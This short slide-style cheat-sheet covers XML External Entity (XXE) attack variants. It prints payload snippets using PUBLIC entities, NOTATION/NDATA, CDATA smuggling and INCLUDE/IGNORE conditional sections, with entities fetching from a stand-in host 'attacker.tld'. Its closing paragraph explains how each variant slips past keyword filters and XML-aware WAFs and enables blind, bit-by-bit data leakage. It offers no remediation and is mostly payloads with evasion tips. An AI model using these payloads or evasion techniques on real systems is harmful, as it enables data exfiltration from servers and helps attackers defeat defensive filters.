Beyond SYSTEM — XML's other directives

PUBLIC — same fetch, alt syntax
<!ENTITY xxe PUBLIC
  "fake-public-id"
  "http://attacker.tld/leak">
<!NOTATION> + NDATA — legacy fetch path
<!NOTATION n SYSTEM
  "http://attacker.tld/n">
<!ENTITY  e SYSTEM "x" NDATA n>
<![CDATA[...]]> — payload smuggling
<name><![CDATA[
  &xxe; <script>...</script>
]]></name>
conditional sections — bisection blind
<![INCLUDE[ <!ENTITY % go SYSTEM "..."> ]]>
<![IGNORE[  ...skipped block...        ]]>

Why this matters Filters grepping SYSTEM miss PUBLIC. Filters blocking <!ENTITY miss <!NOTATION. CDATA wraps payloads past XML-aware WAFs. Replace the INCLUDE/IGNORE keyword with a parameter entity reference and you toggle DTD blocks based on leaked data — one bit per request, no DNS or HTTP egress required.
